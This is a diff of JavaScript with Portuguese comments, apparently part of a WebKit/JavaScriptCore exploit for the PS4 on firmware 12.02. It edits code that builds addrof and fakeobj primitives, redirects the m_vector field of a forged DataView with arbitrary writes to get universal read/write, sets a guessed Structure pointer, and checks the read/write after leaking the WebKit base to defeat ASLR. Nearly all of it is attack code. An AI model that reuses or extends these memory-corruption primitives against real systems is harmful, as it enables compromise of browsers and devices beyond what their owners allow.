@@ -52,7 +52,7 @@ let _fake_data_view = null;     // Um DataView sobre o ArrayBuffer forjado, ser�
 // ESTE É UM CHUTE E PRECISA DE UM VALOR REAL DO AMBIENTE ALVO.
 // PARA FINS DE TESTE, VOU SIMULAR QUE CONSEGUIMOS UM VALOR VAZADO.
 // VOU USAR UMA ADIVINHAÇÃO SIMPLIFICADA QUE O PONTEIRO DA STRUCTURE DO DATAVIEW ESTÁ PERTO DA BASE DA WEBKIT.
-const HARDCODED_JS_DATAVIEW_STRUCTURE_PTR_CANDIDATE = new AdvancedInt64(0xAAAA0000, 0xBBBB0000); // PLACEHOLDER!
+const HARDCODED_JS_DATAVIEW_STRUCTURE_PTR_CANDIDATE = new AdvancedInt64(0x10000000, 0x12345678); // **MUDAR ESTE VALOR!**
 // Um ponteiro Structure* real do PS4 12.02 seria algo como 0x12345678_ABCDEF00.
 
 /**
@@ -161,18 +161,7 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         logFn(`[${FNAME}] Testando L/E Universal com _fake_data_view: Alvo é objeto JS em ${test_target_js_object_addr.toString(true)}`, "info", FNAME);
 
         // Redirecionar o m_vector do fake DataView para o endereço do objeto de teste JS.
-        // IMPORTANTE: Isso não manipula o objeto de apoio, mas sim o _fake_data_view diretamente.
-        // Se _fake_data_view funciona, seus métodos operam no m_vector que você PLANTAR AQUI.
-        _fake_data_view.buffer = new ArrayBuffer(0x100000000); // Cria um novo buffer grande para o fake DV apontar.
-                                                                // A verdadeira manipulação para apontar para `test_target_js_object_addr`
-                                                                // será feita com uma escrita no m_vector do `fake_dv_backing_object`
-                                                                // que é o "corpo" real do `_fake_data_view`.
-                                                                // Isso é um pouco confuso. A abordagem mais direta é reescrever o m_vector do *corpo do objeto falsificado*.
-
-        // A maneira correta de controlar o _fake_data_view é escrever em `fake_dv_backing_object_addr`
-        // o endereço que você quer ler/escrever.
-        
-        // Escrever o endereço do objeto JS de teste no campo m_vector do objeto de apoio (que o _fake_data_view está "vendo")
+        // Isso manipula o corpo do objeto que o _fake_data_view está observando.
         await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), test_target_js_object_addr, 8);
         logFn(`[${FNAME}] m_vector do DataView forjado redirecionado para ${test_target_js_object_addr.toString(true)}.`, "info", FNAME);
 
@@ -184,9 +173,6 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
             const read_back = _fake_data_view.getUint32(0, true);
             if (read_back === TEST_VALUE_UNIVERSAL) {
                 logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (dentro do heap de objetos JS) FUNCIONANDO! Lido: ${toHex(read_back)}.`, "good", FNAME);
-                // Podemos verificar a propriedade original do objeto para confirmar
-                // NOTE: test_prop pode não estar no offset 0. Precisaria de mais engenharia reversa.
-                // Mas se a leitura/escrita via DV funciona, a primitiva universal está lá.
                 
                 // Limpar o m_vector para evitar dangling pointers
                 await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), new AdvancedInt64(0,0), 8);
@@ -427,7 +413,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
         logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
 
-        // Usando o objeto falsificado para teste de R/W pós-vazamento ASLR para maior segurança.
         const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
         if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
             throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
